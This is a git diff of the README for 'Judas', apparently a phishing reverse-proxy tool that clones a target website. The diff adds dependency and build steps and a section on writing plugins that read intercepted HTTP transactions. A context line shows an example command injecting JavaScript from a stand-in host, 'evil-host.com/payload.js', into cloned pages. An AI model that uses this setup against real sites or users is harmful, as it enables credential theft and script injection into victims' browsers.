@@ -5,7 +5,19 @@ It can clone a website passed to it using command line flags.
 
 Building
 --------
-To build Judas, simply ```go build -o judas proxy.go```
+To build Judas, first, get the dependencies:
+ ```
+ go get golang.org/x/net/proxy
+ go get github.com/PuerkitoBio/goquery
+ go build -o judas *.go
+ ```
+
+ Next, build the logging plugin if you want to see responses on the console.
+```
+go build -buildmode=plugin -o loggingplugin.so bundled/loggingplugin.go
+```
+
+To add other plugins, simply place the .so files into the same directory as the judas executable.
 
 Usage
 -----
@@ -42,4 +54,15 @@ Judas can also inject custom JavaScript into requests by passing a URL to a JS f
 Example:
 ```
 ./judas --target https://target-url.com --cert server.crt --private-key server.key --inject-js https://evil-host.com/payload.js
+```
+
+Custom plugins
+--------------
+To create your own plugin, simply create a Go plugin using the standard library plugin package (https://golang.org/pkg/plugin/).
+
+Judas looks for the following symbols:
+```
+var Name string
+func Initialize() (plugins.PluginArguments, error)
+func ProcessTransactions(transactions <-chan plugins.HTTPTransaction, arguments plugins.PluginArguments)
 ```
